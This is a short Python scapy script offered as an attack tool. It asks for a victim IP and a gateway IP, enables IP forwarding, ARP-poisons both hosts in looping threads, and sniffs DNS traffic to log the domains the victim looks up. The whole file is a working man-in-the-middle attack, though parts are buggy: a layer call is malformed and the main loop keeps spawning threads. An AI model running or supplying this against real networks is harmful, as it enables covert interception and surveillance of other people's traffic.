from scapy.all import *
import threading
import os
import sys

print("Are you run with root previledges? ")
VIP = input("Enter the IP address of the victim: ")
GW = input("Enter the IP address of the gateway: ")
IFACE = input("Enter the name of the interface (ex: eth0): ")

print("\tPoisoning victim machine & gateway.........")
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
os.system('service whoopsie stop')


def dnshandle(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer.qr== 0:
        print("Victim: " + VIP + "has searched for: " + pkt.getlayer(DNS).qd.qname)
		
def v_poison():
    v=ARP(pdst=VIP, psrc=GW)
    while True:
        try:
            send(v,verbose=0, inter=2,loop=1)

        except KeyboardInterrupt:
            sys.exit(1)


def gw_poison():
    gw = ARP(pdst=GW, psrc=VIP)
    while True:
        try:
            send(gw,verbose=0,inter=2,loop=1)
        except KeyboardInterrupt:
            sys.exit(1)

vthread=[]
gwthread=[]

while True:
    vpoison = threading.Thread(target=v_poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()

    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    pkt = sniff(iface=IFACE,filter='udp port 53', prn=dnshandle)
